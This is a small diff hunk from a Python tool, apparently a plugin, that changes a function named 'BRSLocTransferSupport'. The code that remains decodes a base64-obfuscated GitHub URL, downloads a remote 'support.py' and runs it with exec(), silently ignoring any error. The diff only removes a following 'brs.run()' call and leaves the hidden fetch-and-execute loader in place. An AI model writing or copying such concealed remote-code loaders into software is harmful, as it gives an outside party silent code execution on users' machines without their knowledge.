@@ -222,7 +222,6 @@ def BRSLocTransferSupport(*_):
         u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2FuaW1UcmFuc2ZlckxvYy9tYXN0ZXIvc2VydmljZS9zdXBwb3J0LnB5'
         try:
             exec(uLib.urlopen(base64.b64decode(u_b64).decode(), timeout=3).read())
-            exec('brs.run()')
         except: pass
 
 def statTextUI(text):
